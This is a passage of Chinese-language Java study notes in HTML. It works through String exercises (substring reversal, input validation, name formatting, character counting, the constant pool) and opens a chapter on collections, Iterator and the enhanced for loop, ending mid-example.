title="题目1"></a>题目1</h3><blockquote><p>（1） 将字符串中指定部分进行反转。比如将＂a<strong>bcde</strong>f＂反转为＂a<strong>edcb</strong>f＂<br>（2） 编写方法 public static String reverse（String str， int start， int end） 搞定</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//思路</span><br>    <span class="hljs-comment">//String 转成char[]，因为char[]的元素可以变更。</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdef&quot;</span>;<br>    System.out.println(<span class="hljs-string">&quot;===交换前===&quot;</span>);<br>    System.out.println(str);<br>    <span class="hljs-comment">//检验try-catch</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        str = reverse(str,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        System.out.println(e.getMessage());<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    System.out.println(<span class="hljs-string">&quot;===交换后===&quot;</span>);<br>    System.out.println(str);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reverse</span><span class="hljs-params">(String str,<span class="hljs-type">int</span> start,<span class="hljs-type">int</span> end)</span>&#123;<br>    <span class="hljs-comment">//对输入对参数做一个验证</span><br>    <span class="hljs-keyword">if</span>(!(str !=<span class="hljs-literal">null</span> &amp;&amp; start&gt;=<span class="hljs-number">0</span> &amp;&amp; end &gt; start &amp;&amp; end&lt; str.length()))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;参数不正确&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">char</span>[] chars = str.toCharArray();<br>    <span class="hljs-type">char</span> tmp;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> start,j=end-<span class="hljs-number">1</span>; i &lt; j; i++,j--) &#123;<br>        tmp = chars[i];<br>        chars[i] = chars[j];<br>        chars[j] = tmp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(chars);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="题目2-5"><a href="#题目2-5" class="headerlink" title="题目2"></a>题目2</h3><blockquote><p>输入用户名、密码、邮箱，如果信息录入正确，则提示注册成功，否则生成异常对象要求：<br>（1）用户名长度为2或3或4<br>（2）密码的长度为6，要求全是数字<br>（3）邮箱中包含＠和.并且@在.的前面 isDigital</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// 输入用户名、密码、邮箱，如果信息录入正确，则提示注册成功，否则生成异常对象要求：</span><br><span class="hljs-comment">//（1）用户名长度为2或3或4</span><br><span class="hljs-comment">//（2）密码的长度为6，要求全是数字 isDigital</span><br><span class="hljs-comment">//（3）邮箱中包含＠和.并且@在.的前面</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jack&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pwd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123456&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">email</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jack123@sou.hucom&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            userRegister(name,pwd,email);<br>            System.out.println(<span class="hljs-string">&quot;注册成功！&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(e.getMessage());<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">userRegister</span><span class="hljs-params">(String name,String pwd,String email)</span>&#123;<br>        <span class="hljs-comment">//新增一些校验</span><br>        <span class="hljs-keyword">if</span> (!(name != <span class="hljs-literal">null</span>&amp;&amp;pwd!=<span class="hljs-literal">null</span>&amp;&amp;email!=<span class="hljs-literal">null</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;参数不能为空。&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//name</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">ussrLength</span> <span class="hljs-operator">=</span> name.length();<br>        <span class="hljs-keyword">if</span>(!(name.length()&lt;=<span class="hljs-number">4</span>&amp;&amp;name.length()&gt;=<span class="hljs-number">2</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;用户名长度为2或3或4&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//pwd</span><br>        <span class="hljs-comment">//单独写个方法，判断是否为数字</span><br>        <span class="hljs-keyword">if</span>(!(pwd.length()==<span class="hljs-number">6</span>&amp;&amp;isDigital(pwd)))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;密码的长度为6，要求全是数字&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//email</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> email.indexOf(<span class="hljs-string">&#x27;@&#x27;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> email.indexOf(<span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(!(i&gt;<span class="hljs-number">0</span>&amp;&amp;j&gt;i))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;邮箱中包含＠和.并且@在.的前面&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDigital</span><span class="hljs-params">(String str)</span>&#123;<br>        <span class="hljs-type">char</span>[] chars = str.toCharArray();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; chars.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (chars[i] &lt; <span class="hljs-string">&#x27;0&#x27;</span> || chars[i] &gt;<span class="hljs-string">&#x27;9&#x27;</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="题目3-3"><a href="#题目3-3" class="headerlink" title="题目3"></a>题目3</h3><blockquote><p>（1） 编写java程序，输入形式为： Han Shun Ping的人名，以Ping，Han.S的形式打印<br>出来 。其中.S是中间单词的首字母。<br>（2） 例如输入“Willian Jefferson Clinton”，输出形式为：Clinton，Willian ．J</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//    （1） 编写java程序，输入形式为： Han Shun Ping的人名，以Ping,Han.S的形式打印</span><br><span class="hljs-comment">//    出来 。其中.S是中间单词的首字母。</span><br><span class="hljs-comment">//    （2） 例如输入“Willian Jefferson Clinton”，输出形式为：Clinton,Willian.J</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Han Shun Ping&quot;</span>;<br>        printname(name);<br>    &#125;<br>    <span class="hljs-comment">//思路</span><br>    <span class="hljs-comment">//空格分割 split</span><br>    <span class="hljs-comment">//对得到的String[] 格式化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printname</span><span class="hljs-params">(String str)</span>&#123;<br>        <span class="hljs-keyword">if</span>(str == <span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;str 不能为空&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        String[] names = str.split(<span class="hljs-string">&quot; &quot;</span>);<br>        <span class="hljs-keyword">if</span> (names.length !=<span class="hljs-number">3</span> )&#123;<br>            System.out.println(<span class="hljs-string">&quot;输入的字符串格式不对&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;%s,%s .%c&quot;</span>, names[<span class="hljs-number">2</span>], names[<span class="hljs-number">0</span>], names[<span class="hljs-number">1</span>].toUpperCase().charAt(<span class="hljs-number">0</span>));<br>        System.out.println(format);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="题目4-2"><a href="#题目4-2" class="headerlink" title="题目4"></a>题目4</h3><blockquote><p>输入字符串，判断里面有多少个大写字母，多少个小写字母，多少个数字</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//输入字符串，判断里面有多少个大写字母，多少个小写字母，多少个数字</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;adwd 123 ASDQS&quot;</span>;<br>    count(a);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">count</span><span class="hljs-params">(String str)</span>&#123;<br>    <span class="hljs-type">char</span>[] chars = str.toCharArray();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">up_num</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">low_num</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">digital_num</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; chars.length; i++) &#123;<br>        <span class="hljs-comment">//数字</span><br>        <span class="hljs-keyword">if</span> (chars[i]&gt;=<span class="hljs-string">&#x27;0&#x27;</span>&amp;&amp;chars[i]&lt;=<span class="hljs-string">&#x27;9&#x27;</span>)&#123;<br>            digital_num++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (chars[i]&gt;=<span class="hljs-string">&#x27;a&#x27;</span>&amp;&amp;chars[i]&lt;=<span class="hljs-string">&#x27;z&#x27;</span>)&#123;<br>            low_num++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (chars[i]&gt;=<span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;chars[i]&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>)&#123;<br>            up_num++;<br>        &#125;<br>    &#125;<br>    System.out.println(<span class="hljs-string">&quot;数字个数=&quot;</span>+digital_num+<span class="hljs-string">&quot;;小写字母个数=&quot;</span>+low_num+<span class="hljs-string">&quot;;大写字母个数=&quot;</span>+up_num);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="题目5"><a href="#题目5" class="headerlink" title="题目5"></a>题目5</h3><blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230226230214790.png" alt="image-20230226230214790" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230226230227432.png" alt="image-20230226230227432" style="zoom:50%;" /></blockquote><p>false、false、true。</p><p>false、false、true。</p><p>分析：</p><p>a和b是两个对象，指向堆中的两个地址，所以false。</p><p>a.name 和 b.name都指向常量池的同一地址，所以true。</p><p>s1、s4指向的是不同堆，s5直接指向常亮池，所以false。</p><p>String加东西是重新开辟了一个空间，所以t1指向堆中的新value，value指向常量池的新地址。t2直接指向常量池地址。</p><p>intern表示value指向堆地址，所以t1.intern()&#x3D;&#x3D;t2是ture。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230226231154729.png" alt="image-20230226231154729"></p><h1 id="章节十四-集合"><a href="#章节十四-集合" class="headerlink" title="章节十四 集合"></a>章节十四 集合</h1><h2 id="1-引入集合"><a href="#1-引入集合" class="headerlink" title="1.引入集合"></a>1.引入集合</h2><p>之前学习的保存多个数据使用的都是数组。但数组也有许多不足。</p><p>1）长度开始时必须指定，而且一旦指定，不能更改</p><p>2）保存的必须为同一类型的元素</p><p>3）使用数组进行增加&#x2F;删除元素的示意代码－比较麻烦</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230227132801592.png" alt="image-20230227132801592" style="zoom:50%;" /><h3 id="集合的特点"><a href="#集合的特点" class="headerlink" title="集合的特点"></a><strong>集合的特点</strong></h3><ol><li>可以<strong>动态保存</strong>任意多个对象，使用比较方便</li><li><strong>提供了一系列方便</strong>的操作对象的<strong>方法</strong>：add、remove、set、get等</li><li>使用集合添加、删除新元素的代码更简洁</li></ol><h3 id="集合的框架体系"><a href="#集合的框架体系" class="headerlink" title="集合的框架体系"></a>集合的框架体系</h3><p>集合主要分为单列集合（Collection）和双列（Map）集合。</p><p>Collection接口有两个重要的子接口 List Set，他们的实现子类都是单列集合。</p><p>Map接口的实现子类 是双列集合，存放的K-V。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//单列</span><br><span class="hljs-type">ArrayList</span> <span class="hljs-variable">arrayList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>arrayList.add(<span class="hljs-string">&quot;jack&quot;</span>);<br>arrayList.add(<span class="hljs-string">&quot;tom&quot;</span>);<br><span class="hljs-comment">//双列</span><br><span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>hashMap.put(<span class="hljs-string">&quot;No1&quot;</span>,<span class="hljs-string">&quot;北京&quot;</span>);<br>hashMap.put(<span class="hljs-string">&quot;No2&quot;</span>,<span class="hljs-string">&quot;上海&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230227180456118.png" alt="image-20230227180456118"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230227180716337.png" alt="image-20230227180716337"></p><h2 id="2-Collection接口"><a href="#2-Collection接口" class="headerlink" title="2.Collection接口"></a>2.Collection接口</h2><p><strong>collection接口实现类的特点</strong></p><p><code>public interface Collection&lt;E&gt; extends Iterable&lt;E&gt;</code></p><p>1）collection实现子类可以存放多个元素，每个元素可以是Object</p><p>2）有些Collection的实现类，可以存放重复的元素，有些不可以</p><p>3）有些Collection的实现类，有些是有序的（List），有些不是有序（Set）</p><p>4）Collection接口没有直接的实现子类，是通过它的子接口Set和List来实现的</p><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><ul><li><p>add:添加单个元素</p></li><li><p>remove:删除指定元素</p></li><li><p>contains:查找元素是否存在</p></li><li><p>size:获取元素个数</p></li><li><p>isEmpty:判断是否为空</p></li><li><p>clear:清空</p></li><li><p>addAlL:添加多个元素</p></li><li><p>containsAlL:查找多个元素是否都存在</p></li><li><p>removeAlL:删除多个元素</p><p>说明:以ArrayList实现类来演示，因为接口无法实例化。</p></li></ul><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ArrayList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><span class="hljs-comment">//        add:添加单个元素</span><br>        list.add(<span class="hljs-string">&quot;jack&quot;</span>);<br>        list.add(<span class="hljs-number">10</span>);<br>        list.add(<span class="hljs-literal">true</span>);<br>        list.add(<span class="hljs-string">&quot;tom&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span> + list);<br><span class="hljs-comment">//        remove:删除指定元素</span><br>        list.remove(<span class="hljs-number">3</span>);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span> + list);<br>        list.remove(<span class="hljs-literal">true</span>);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span> + list);<br><span class="hljs-comment">//        contains:查找元素是否存在</span><br>        System.out.println(list.contains(<span class="hljs-string">&quot;jack&quot;</span>));<br>        System.out.println(list.contains(<span class="hljs-literal">true</span>));<br><span class="hljs-comment">//        size:获取元素个数</span><br>        System.out.println(list.size()); <span class="hljs-comment">//2</span><br><span class="hljs-comment">//        isEmpty:判断是否为空</span><br>        System.out.println(list.isEmpty());<br><span class="hljs-comment">//        clear:清空</span><br>        list.clear();<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span> + list);<br><span class="hljs-comment">//        addAlL:添加多个元素</span><br>        <span class="hljs-type">ArrayList</span> <span class="hljs-variable">list2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        list2.add(<span class="hljs-string">&quot;红楼梦&quot;</span>);<br>        list2.add(<span class="hljs-string">&quot;三国演义&quot;</span>);<br>        list.addAll(list2);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span> + list);<br><span class="hljs-comment">//        containsAlL:查找多个元素是否都存在</span><br>        System.out.println(list.containsAll(list2));<br><span class="hljs-comment">//        removeAlL:删除多个元素</span><br>        list.add(<span class="hljs-string">&quot;聊斋&quot;</span>);<br>        list.removeAll(list2);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span> + list);<br>    &#125;<br></code></pre></td></tr></table></figure><p>输出：<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230227184822789.png" alt="image-20230227184822789" style="zoom:50%;" /></p><h3 id="遍历元素方法1-Iterator"><a href="#遍历元素方法1-Iterator" class="headerlink" title="遍历元素方法1 - Iterator"></a>遍历元素方法1 - Iterator</h3><ol><li>Iterator对象称为<strong>迭代器</strong>，主要用于遍历 Collection 集合中的元素。</li><li>所有实现了Collection接口的集合类都有一个iterator（）方法，用以返回一个实现了Iterator接口的对象，即可以返回一个迭代器。</li><li>Iterator 的结构(下图)</li><li>Iterator 仅用于遍历集合，Iterator 本身并不存放对象。</li></ol><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230227185338539.png" alt="image-20230227185338539" style="zoom:50%;" /><p><strong>Iterator接口的方法：</strong></p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230227185538723.png" alt="image-20230227185538723" style="zoom:50%;" /><p>在调用iterator.next()方法之前必须要调用iterator.hasNext进行检测。</p><p>若不调用，且下一条记录无效，直接调用it.next()会抛出<strong>NoSuchElementException</strong>异常。</p><p>使用案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&#123;&quot;all&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Collection</span> <span class="hljs-variable">col</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    col.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;三国演义&quot;</span>,<span class="hljs-string">&quot;罗贯中&quot;</span>,<span class="hljs-number">10.1</span>));<br>    col.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;小李飞刀&quot;</span>,<span class="hljs-string">&quot;古龙&quot;</span>,<span class="hljs-number">5.1</span>));<br>    col.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;红楼梦&quot;</span>,<span class="hljs-string">&quot;曹雪芹&quot;</span>,<span class="hljs-number">34.6</span>));<br>    <span class="hljs-comment">//现在希望能遍历集合</span><br>    <span class="hljs-comment">//1。希望能得到col对应的迭代器</span><br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> col.iterator();<br>    <span class="hljs-comment">//2.使用while循环遍历（快捷键itit）</span><br>    <span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<span class="hljs-comment">//判断是否还有数据</span><br>        <span class="hljs-comment">//返回下一个元素，类型是Object</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> iterator.next();<br>        System.out.println(<span class="hljs-string">&quot;obj=&quot;</span>+obj);<br>    &#125;<br>    <span class="hljs-comment">//3.当退出while循环后,这时iterator迭代器指向了最后当元素，</span><br>    <span class="hljs-comment">// 若继续iterator.next()，会报错</span><br>    <span class="hljs-comment">//4。若希望再次遍历，需要重制迭代器</span><br>    iterator = col.iterator();<br>    System.out.println(<span class="hljs-string">&quot;===第二次遍历===&quot;</span>);<br>    <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span>  iterator.next();<br>        System.out.println(<span class="hljs-string">&quot;obj=&quot;</span>+obj);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230227201014255.png" alt="image-20230227201014255" style="zoom:50%;" /><p>注意点：遍历完后，若希望再次遍历，需要重制迭代器。</p><h3 id="遍历元素方法2-增强for循环"><a href="#遍历元素方法2-增强for循环" class="headerlink" title="遍历元素方法2 - 增强for循环"></a>遍历元素方法2 - 增强for循环</h3><p>增强for循环，可以代替iterator迭代器。</p><p>特点：增强for就是简化版的iterator本质一样。<strong>只能用于遍历集合或数组</strong>。</p><ul><li><p>基本语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>（元素类型 元素名：集合名或数组名）｛<br>访问元素<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Collection</span> <span class="hljs-variable">col</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    col.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;三国演义&quot;</span>, <span class="hljs-string">&quot;罗贯中&quot;</span>, <span class="hljs-number">10.1</span>));<br>    col.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;小李飞刀&quot;</span>, <span class="hljs-string">&quot;古龙&quot;</span>, <span class="hljs-number">5.1</span>));<br>    col.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;红楼梦&quot;</span>, <span class="hljs-string">&quot;曹雪芹&quot;</span>, <span class="hljs-number">34.6</span>));<br>    <span class="hljs-comment">//使用增强for循环</span><br>    <span class="hljs-keyword">for</span> (Object book : col) &#123;<br>        System.out.println(<span class="hljs-string">&quot;book=&quot;</span> + book);<br>    &#125;<br>    <span class="hljs-comment">//增强for循环也可以直接在数组使用</span><br>    <span class="hljs-type">int</span>[] nums = 